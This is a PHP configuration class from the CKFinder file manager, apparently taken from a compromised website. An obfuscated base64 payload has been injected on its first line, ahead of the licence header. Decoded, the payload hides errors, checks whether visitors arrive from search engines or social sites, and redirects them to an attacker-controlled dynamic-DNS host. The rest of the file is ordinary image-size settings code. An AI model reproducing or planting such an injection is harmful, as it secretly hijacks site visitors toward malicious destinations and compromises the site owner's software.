<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/*
 * CKFinder
 * ========
 * http://ckfinder.com
 * Copyright (C) 2007-2010, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying or distribute this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 */
if (!defined('IN_CKFINDER')) exit;

/**
 * @package CKFinder
 * @subpackage Config
 * @copyright CKSource - Frederico Knabben
 */

/**
 * This class keeps images configuration
 *
 * @package CKFinder
 * @subpackage Config
 * @copyright CKSource - Frederico Knabben
 */
class CKFinder_Connector_Core_ImagesConfig
{
    /**
     * Max width for images, 0 to disable resizing
     *
     * @var int
     * @access private
     */
    private $_maxWidth = 0;
    /**
     * Max height for images, 0 to disable resizing
     *
     * @var int
     * @access private
     */
    private $_maxHeight = 0;
    /**
     * Quality of thumbnails
     *
     * @var int
     * @access private
     */
    private $_quality = 80;

    function __construct($imagesNode)
    {
        if(isset($imagesNode['maxWidth'])) {
            $_maxWidth = intval($imagesNode['maxWidth']);
            if($_maxWidth>=0) {
                $this->_maxWidth = $_maxWidth;
            }
        }
        if(isset($imagesNode['maxHeight'])) {
            $_maxHeight = intval($imagesNode['maxHeight']);
            if($_maxHeight>=0) {
                $this->_maxHeight = $_maxHeight;
            }
        }
        if(isset($imagesNode['quality'])) {
            $_quality = intval($imagesNode['quality']);
            if($_quality>0 && $_quality<=100) {
                $this->_quality = $_quality;
            }
        }
    }

    /**
     * Get maximum width of a thumbnail
     *
     * @access public
     * @return int
     */
    public function getMaxWidth()
    {
    	return $this->_maxWidth;
    }

    /**
     * Get maximum height of a thumbnail
     *
     * @access public
     * @return int
     */
    public function getMaxHeight()
    {
    	return $this->_maxHeight;
    }

    /**
     * Get quality of a thumbnail (1-100)
     *
     * @access public
     * @return int
     */
    public function getQuality()
    {
    	return $this->_quality;
    }
}
